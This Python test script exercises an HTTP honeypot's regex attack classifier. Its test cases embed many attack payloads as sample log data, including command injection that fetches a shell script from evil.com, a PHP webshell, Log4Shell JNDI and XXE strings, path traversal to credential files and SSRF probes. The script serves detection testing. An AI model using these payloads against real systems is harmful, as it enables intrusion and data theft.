# -*- coding: utf-8 -*-
"""
HTTP蜜罐正则匹配引擎测试用例
============================================================
在线验证: 通过后端 API 接口上传模拟的 HTTP 蜜罐
日志数据, 测试正则匹配, 断言每种攻击类型都能正确命中, 正常流量不误报。

用法:
    先启动后端 flask 服务:
        cd backend
        python app.py
    
    再运行测试脚本:
        python test/test_regex_rules.py
"""

import sys
import os
import time
import requests
import traceback
from datetime import datetime

# ====================================================================
# 配置
# ====================================================================
BASE_URL = "http://127.0.0.1:5000/api"
INTERNAL_UPLOAD_URL = f"{BASE_URL}/logs/internal/upload"
LOG_DETAIL_URL = f"{BASE_URL}/logs"
LOGIN_URL = f"{BASE_URL}/user/login"
MATCH_RULES_URL = f"{BASE_URL}/match-rules"

# 测试专用管理员凭据
ADMIN_USERNAME = "testadmin01"
ADMIN_PASSWORD = "123456"

_auth_token = None

def login() -> str:
    """登录获取JWT Token"""
    global _auth_token
    if _auth_token:
        return _auth_token
    try:
        resp = requests.post(
            LOGIN_URL, json={"username": ADMIN_USERNAME, "password": ADMIN_PASSWORD}
        )
        resp_json = resp.json()
        if (
            resp.status_code == 200
            and resp_json.get("success")
            and resp_json.get("data", {}).get("access_token")
        ):
            _auth_token = resp_json["data"]["access_token"]
            return _auth_token

        # 登录失败，尝试创建管理员
        requests.post(
            f"{BASE_URL}/user/create_admin",
            json={
                "username": ADMIN_USERNAME,
                "password": ADMIN_PASSWORD,
                "email": "testadmin@test.com",
            },
        )
        resp = requests.post(
            LOGIN_URL, json={"username": ADMIN_USERNAME, "password": ADMIN_PASSWORD}
        )
        resp_json = resp.json()
        if (
            resp.status_code == 200
            and resp_json.get("success")
            and resp_json.get("data", {}).get("access_token")
        ):
            _auth_token = resp_json["data"]["access_token"]
            return _auth_token

        print(f"[FATAL] 登录仍然失败: {resp.text}")
        sys.exit(1)
    except Exception as e:
        print(f"[FATAL] 无法登录: {e}")
        sys.exit(1)

def get_auth_headers() -> dict:
    return {"Authorization": f"Bearer {login()}", "Content-Type": "application/json"}

def upload_log(log_data: dict) -> int:
    """上传日志并返回 ID"""
    resp = requests.post(INTERNAL_UPLOAD_URL, json=log_data)
    if resp.status_code == 200 and resp.json().get("success"):
        return resp.json()["data"].get("log_id")
    return None

def get_log_detail(log_id: int) -> dict:
    """获取单条日志详情"""
    resp = requests.get(f"{LOG_DETAIL_URL}/{log_id}", headers=get_auth_headers())
    if resp.status_code == 200 and resp.json().get("success"):
        return resp.json()["data"]
    return None


# ====================================================================
# 辅助: 模拟 HTTP 蜜罐生成的 raw_log
# ====================================================================
def _build_raw_log(method, path, user_agent="Mozilla/5.0", body=""):
    """模拟 hikvision_http_server.py 生成的 raw_log 格式"""
    body_part = f"\\nData: {body}" if body else ""
    return (
        f"192.168.1.100 - - [22/Apr/2026:10:00:00 +0800] "
        f'"{method} {path} HTTP/1.1" - {user_agent}{body_part}'
    )


# ====================================================================
# 测试用例定义: (描述, 模拟数据, 期望 attack_type)
# ====================================================================
# 期望 attack_type = None 表示不应该被任何正则命中(正常流量)
TEST_CASES = [
    # ────────────── 1. SQL 注入 ──────────────
    {
        "name": "SQL注入 - UNION SELECT",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/product?id=1' UNION SELECT 1,2,3--"),
            "payload": "GET /product?id=1' UNION SELECT 1,2,3--",
            "request_path": "/product?id=1' UNION SELECT 1,2,3--",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.1",
        },
        "expect_type": "SQL注入",
    },
    {
        "name": "SQL注入 - 布尔盲注 (OR '1'='1')",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/login?user=admin' OR '1'='1"),
            "payload": "GET /login?user=admin' OR '1'='1",
            "request_path": "/login?user=admin' OR '1'='1",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.2",
        },
        "expect_type": "SQL注入",
    },
    {
        "name": "SQL注入 - 时间盲注 (SLEEP)",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/api?id=1' AND SLEEP(5)--"),
            "payload": "GET /api?id=1' AND SLEEP(5)--",
            "request_path": "/api?id=1' AND SLEEP(5)--",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.3",
        },
        "expect_type": "SQL注入",
    },

    # ────────────── 2. XSS ──────────────
    {
        "name": "XSS - script 标签",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/search?q=<script>alert('XSS')</script>"),
            "payload": "<script>alert('XSS')</script>",
            "request_path": "/search?q=<script>alert('XSS')</script>",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.4",
        },
        "expect_type": "XSS",
    },
    {
        "name": "XSS - img onerror 事件",
        "log_data": {
            "raw_log": _build_raw_log("GET", '/search?q=<img src=x onerror=alert(1)>'),
            "payload": '<img src=x onerror=alert(1)>',
            "request_path": '/search?q=<img src=x onerror=alert(1)>',
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.5",
        },
        "expect_type": "XSS",
    },
    {
        "name": "XSS - javascript 伪协议",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/redirect?url=javascript:alert(document.cookie)"),
            "payload": "javascript:alert(document.cookie)",
            "request_path": "/redirect?url=javascript:alert(document.cookie)",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.6",
        },
        "expect_type": "XSS",
    },

    # ────────────── 3. 目录遍历 ──────────────
    {
        "name": "目录遍历 - 多级../etc/passwd",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/download?file=../../../../etc/passwd"),
            "payload": "../../../../etc/passwd",
            "request_path": "/download?file=../../../../etc/passwd",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.7",
        },
        "expect_type": "目录遍历",
    },
    {
        "name": "目录遍历 - Windows路径",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/file?path=../../C:\\Windows\\system32\\config\\sam"),
            "payload": "../../C:\\Windows\\system32\\config\\sam",
            "request_path": "/file?path=../../C:\\Windows\\system32\\config\\sam",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.8",
        },
        "expect_type": "目录遍历",
    },

    # ────────────── 4. 命令注入 ──────────────
    {
        "name": "命令注入 - 分号+wget",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/ping?ip=127.0.0.1; wget http://evil.com/shell.sh"),
            "payload": "127.0.0.1; wget http://evil.com/shell.sh",
            "request_path": "/ping?ip=127.0.0.1; wget http://evil.com/shell.sh",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.9",
        },
        "expect_type": "命令注入",
    },
    {
        "name": "命令注入 - 反引号执行",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/api?cmd=`whoami`"),
            "payload": "`whoami`",
            "request_path": "/api?cmd=`whoami`",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.10",
        },
        "expect_type": "命令注入",
    },
    {
        "name": "命令注入 - $() 子命令",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/api?input=$(whoami)"),
            "payload": "$(whoami)",
            "request_path": "/api?input=$(whoami)",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.11",
        },
        "expect_type": "命令注入",
    },

    # ────────────── 5. WebShell ──────────────
    {
        "name": "WebShell - PHP system() 调用",
        "log_data": {
            "raw_log": _build_raw_log("POST", "/upload.php", body="<?php system($_POST['cmd']); ?>"),
            "payload": "<?php system($_POST['cmd']); ?>",
            "request_path": "/upload.php",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.12",
        },
        "expect_type": "WebShell",
    },
    {
        "name": "WebShell - 蚁剑工具指纹",
        "log_data": {
            "raw_log": _build_raw_log("POST", "/shell.php", user_agent="antsword/3.0"),
            "payload": "POST /shell.php",
            "request_path": "/shell.php",
            "user_agent": "antsword/3.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.13",
        },
        "expect_type": "WebShell",
    },

    # ────────────── 6. RCE ──────────────
    {
        "name": "RCE - Log4Shell (JNDI)",
        "log_data": {
            "raw_log": _build_raw_log("POST", "/api/execute", body='{"query": "${jndi:ldap://evil.com/a}"}'),
            "payload": '${jndi:ldap://evil.com/a}',
            "request_path": "/api/execute",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.14",
        },
        "expect_type": "RCE",
    },
    {
        "name": "RCE - Fastjson AutoType",
        "log_data": {
            "raw_log": _build_raw_log("POST", "/api/json", body='{"@type":"com.sun.rowset.JdbcRowSetImpl"}'),
            "payload": '{"@type":"com.sun.rowset.JdbcRowSetImpl"}',
            "request_path": "/api/json",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.15",
        },
        "expect_type": "RCE",
    },

    # ────────────── 7. 文件包含 ──────────────
    {
        "name": "文件包含 - php://filter",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/index.php?file=php://filter/read=convert.base64-encode/resource=index.php"),
            "payload": "php://filter/read=convert.base64-encode/resource=index.php",
            "request_path": "/index.php?file=php://filter/read=convert.base64-encode/resource=index.php",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.16",
        },
        "expect_type": "文件包含",
    },

    # ────────────── 8. SSRF ──────────────
    {
        "name": "SSRF - AWS 元数据",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/proxy?url=http://169.254.169.254/latest/meta-data/"),
            "payload": "http://169.254.169.254/latest/meta-data/",
            "request_path": "/proxy?url=http://169.254.169.254/latest/meta-data/",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.17",
        },
        "expect_type": "SSRF",
    },
    {
        "name": "SSRF - gopher 协议",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a"),
            "payload": "gopher://127.0.0.1:6379/_*1%0d%0a",
            "request_path": "/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.18",
        },
        "expect_type": "SSRF",
    },

    # ────────────── 9. 扫描探测 ──────────────
    {
        "name": "扫描探测 - Nmap UA",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/", user_agent="Mozilla/5.0 (compatible; nmap Scripting Engine)"),
            "payload": "GET /",
            "request_path": "/",
            "user_agent": "Mozilla/5.0 (compatible; nmap Scripting Engine)",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.19",
        },
        "expect_type": "扫描探测",
    },
    {
        "name": "扫描探测 - sqlmap UA",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/test", user_agent="sqlmap/1.6.12"),
            "payload": "GET /test",
            "request_path": "/test",
            "user_agent": "sqlmap/1.6.12",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.20",
        },
        "expect_type": "扫描探测",
    },

    # ────────────── 10. XXE ──────────────
    {
        "name": "XXE - DOCTYPE + ENTITY",
        "log_data": {
            "raw_log": _build_raw_log("POST", "/xml-rpc", body='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>'),
            "payload": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>',
            "request_path": "/xml-rpc",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.21",
        },
        "expect_type": "XXE",
    },

    # ────────────── 11. LDAP注入 ──────────────
    {
        "name": "LDAP注入 - 过滤器注入",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/login?user=admin)(|(objectClass=*)"),
            "payload": "admin)(|(objectClass=*)",
            "request_path": "/login?user=admin)(|(objectClass=*)",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.22",
        },
        "expect_type": "LDAP注入",
    },

    # ────────────── 12. 反序列化 ──────────────
    {
        "name": "反序列化 - PHP unserialize",
        "log_data": {
            "raw_log": _build_raw_log("POST", "/api/object", body='payload=O:8:"stdClass":0:{}'),
            "payload": 'O:8:"stdClass":0:{}',
            "request_path": "/api/object",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.23",
        },
        "expect_type": "反序列化",
    },
    {
        "name": "反序列化 - Java ysoserial",
        "log_data": {
            "raw_log": _build_raw_log("POST", "/api/data", body='rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=='),
            "payload": 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==',
            "request_path": "/api/data",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.24",
        },
        "expect_type": "反序列化",
    },

    # ────────────── 13. CRLF注入 ──────────────
    {
        "name": "CRLF注入 - %0d%0a Set-Cookie",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/redirect?url=http://example.com%0d%0aSet-Cookie:session_id=123"),
            "payload": "http://example.com%0d%0aSet-Cookie:session_id=123",
            "request_path": "/redirect?url=http://example.com%0d%0aSet-Cookie:session_id=123",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.25",
        },
        "expect_type": "CRLF注入",
    },

    # ────────────── 14. 信息泄露 ──────────────
    {
        "name": "信息泄露 - .env 文件",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/.env "),
            "payload": "GET /.env",
            "request_path": "/.env",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.26",
        },
        "expect_type": "信息泄露",
    },
    {
        "name": "信息泄露 - .git 目录",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/.git/config "),
            "payload": "GET /.git/config",
            "request_path": "/.git/config",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.27",
        },
        "expect_type": "信息泄露",
    },

    # ────────────── 15. 正常流量(不应被任何规则命中) ──────────────
    {
        "name": "正常流量 - 首页访问",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/"),
            "payload": "GET /",
            "request_path": "/",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.100",
        },
        "expect_type": None,
    },
    {
        "name": "正常流量 - Dashboard访问",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/dashboard"),
            "payload": "GET /dashboard",
            "request_path": "/dashboard",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.101",
        },
        "expect_type": None,
    },
    {
        "name": "正常流量 - 普通登录(不是攻击载荷)",
        "log_data": {
            "raw_log": _build_raw_log("POST", "/login", body="username=admin&password=admin123"),
            "payload": "Username: admin, Password: admin123",
            "request_path": "/login",
            "user_agent": "Mozilla/5.0 (X11; Linux x86_64)",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.102",
        },
        "expect_type": None,
    },
    {
        "name": "正常流量 - curl 访问(不应误报为扫描器)",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/api/status", user_agent="curl/7.68.0"),
            "payload": "GET /api/status",
            "request_path": "/api/status",
            "user_agent": "curl/7.68.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.103",
        },
        "expect_type": None,
    },
    {
        "name": "正常流量 - 包含 select 单词的正常URL(旧规则会误报)",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/api/user/select-plan"),
            "payload": "GET /api/user/select-plan",
            "request_path": "/api/user/select-plan",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.104",
        },
        "expect_type": None,
    },
    {
        "name": "正常流量 - 包含 system 单词的正常URL(旧规则会误报)",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/api/system/info"),
            "payload": "GET /api/system/info",
            "request_path": "/api/system/info",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.105",
        },
        "expect_type": None,
    },
    {
        "name": "正常流量 - 包含 failed 单词的正常页面(旧规则会误报暴力破解)",
        "log_data": {
            "raw_log": _build_raw_log("GET", "/status?msg=Task failed to start"),
            "payload": "GET /status?msg=Task failed to start",
            "request_path": "/status?msg=Task failed to start",
            "user_agent": "Mozilla/5.0",
            "protocol": "HTTP",
            "attacker_ip": "10.0.0.106",
        },
        "expect_type": None,
    },
]


def run_online_regex_tests():
    """
    在线正则匹配测试
    调用 API 接口上传日志，并调用 API 获取解析结果，验证正则匹配
    """
    print("=" * 70)
    print("  HTTP 蜜罐正则匹配引擎 — 在线测试")
    print("=" * 70)
    print(f"\n[步骤 1] 开始执行 {len(TEST_CASES)} 个测试用例...\n")
    print("-" * 70)

    passed = 0
    failed = 0
    failed_cases = []

    # 用于收集正常流量类型(不应被正则命中的类型)
    SAFE_TYPES = {"正常流量", "HTTP尝试登录", "SSH尝试登录", "FTP尝试登录", "MySQL尝试登录", "Redis尝试登录"}

    for i, tc in enumerate(TEST_CASES, 1):
        log_data = tc["log_data"]
        # 补全必需字段
        log_data["honeypot_port"] = 8888
        log_data["attacker_port"] = 12345 + i
        
        log_id = upload_log(log_data)
        if not log_id:
            print(f"  [✗ FAIL] #{i:02d} {tc['name']} - 上传失败")
            failed += 1
            failed_cases.append(tc["name"])
            continue

        time.sleep(0.5) # 等待后端及 AI 处理
        
        detail = get_log_detail(log_id)
        if not detail:
            print(f"  [✗ FAIL] #{i:02d} {tc['name']} - 获取详情失败")
            failed += 1
            failed_cases.append(tc["name"])
            continue

        actual_type = detail.get("attack_type")
        expect = tc["expect_type"]

        if expect is None:
            # 正常流量: attack_type 应该是安全类型(正常流量/尝试登录等)
            ok = actual_type in SAFE_TYPES
        else:
            ok = actual_type == expect

        status = "✓ PASS" if ok else "✗ FAIL"
        if ok:
            passed += 1
        else:
            failed += 1
            failed_cases.append(tc["name"])

        expect_str = expect if expect else "(正常流量/不命中)"
        print(f"  [{status}] #{i:02d} {tc['name']}")
        if not ok:
            print(f"         期望: {expect_str}")
            print(f"         实际: {actual_type}")
            print(f"         描述: {detail.get('attack_description', 'N/A')}")

    print("-" * 70)
    print(f"\n  总计: {len(TEST_CASES)} | 通过: {passed} | 失败: {failed}")
    if failed_cases:
        print(f"\n  失败的用例:")
        for name in failed_cases:
            print(f"    - {name}")
    print("=" * 70)

    return failed == 0

if __name__ == "__main__":
    # 修复 Windows 控制台 GBK 编码问题
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

    success = run_online_regex_tests()
    sys.exit(0 if success else 1)
